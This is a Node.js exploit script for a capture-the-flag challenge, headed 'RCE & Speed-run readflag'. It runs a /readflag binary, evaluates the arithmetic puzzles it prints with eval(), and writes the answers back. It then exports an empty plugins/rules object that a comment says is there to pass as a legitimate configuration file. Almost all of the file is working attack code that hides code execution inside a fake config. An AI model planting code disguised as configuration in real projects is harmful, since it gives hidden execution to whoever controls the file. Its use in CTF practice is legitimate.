/* 
   Exploit for Codex CTF
   Target: RCE & Speed-run readflag
*/

const { spawn } = require('child_process');

console.log("==============[ EXPLOIT START ]==============");

try {
    // 使用 spawn 启动，直接接管 stdio 流
    const p = spawn('/readflag', [], {
        stdio: ['pipe', 'pipe', 'pipe'] 
    });

    let output = '';

    p.stdout.on('data', (data) => {
        const chunk = data.toString();
        output += chunk;
        
        // 极速匹配表达式 ((((...
        // 只要发现带有连续的左括号，立即截取并计算
        if (chunk.includes('(((')) {
            // 提取算式：按行拆分，找包含括号的行
            const lines = chunk.split('\n');
            for (let line of lines) {
                line = line.trim();
                // 简单的特征锁定
                if (line.startsWith('((')) {
                    try {
                        // Node.js 的 eval 计算数学表达式非常快且准确
                        const ans = eval(line);
                        console.log(`[+] Expr: ${line} = ${ans}`);
                        
                        // 立即写入答案，不要带多余的 buffer 操作
                        p.stdin.write(ans + '\n');
                    } catch (e) {
                        // 忽略非表达式报错
                    }
                }
            }
        }
    });

    // 捕获 flag 输出
    p.stdout.on('end', () => {
        console.log("==============[ READFLAG OUTPUT ]==============");
        console.log(output);
        console.log("===============================================");
    });
    
    p.stderr.on('data', (d) => process.stderr.write(d));

} catch (e) {
    console.error(`[!] Exploit Error: ${e.message}`);
}

// 必须导出空对象，防止加载器崩溃
module.exports = {
    // 假装自己是个合法配置
    plugins: [],
    rules: {}
};
